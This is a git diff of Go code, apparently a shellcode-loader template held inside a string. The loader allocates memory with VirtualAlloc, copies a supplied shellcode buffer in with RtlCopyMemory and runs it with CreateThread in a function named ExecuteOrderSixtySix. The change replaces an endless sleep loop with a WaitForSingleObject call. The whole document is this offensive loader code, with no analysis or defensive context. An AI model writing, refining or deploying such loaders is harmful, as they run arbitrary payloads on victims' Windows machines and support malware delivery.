@@ -14,7 +14,6 @@ package main
 import (
 	"syscall"
 	"unsafe"
-    "time"
 )
 
 const (
@@ -27,9 +26,11 @@ var (
 	kernel32        = syscall.MustLoadDLL("kernel32.dll")
 	ntdll           = syscall.MustLoadDLL("ntdll.dll")
 
-	VirtualAlloc    = kernel32.MustFindProc("VirtualAlloc")
-	RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
-	CreateThread    = kernel32.MustFindProc("CreateThread")
+    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
+	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
+	CreateThread        = kernel32.MustFindProc("CreateThread")
+
+    RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
 )
 
 func ExecuteOrderSixtySix(shellcode []byte) {
@@ -46,7 +47,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 		uintptr(len(shellcode)),
 	)
 
-	_, _, _ = CreateThread.Call(
+    threadAddr, _, _ := CreateThread.Call(
 		0,
 		0,
 		addr,
@@ -55,15 +56,10 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 		0,
 	)
 
-    /*
-        FIXME(djnn): it seems that we cant use select instead at
-        the risk of a deadlock, which kind of sucks
-
-        instead, let's just wait manually like this xD (which also sucks)
-    */
-    for {
-        time.Sleep(100 * time.Second)
-    }
+    WaitForSingleObject.Call(
+        threadAddr,
+        0xFFFFFFFF,
+    )
 }
     `)
 }
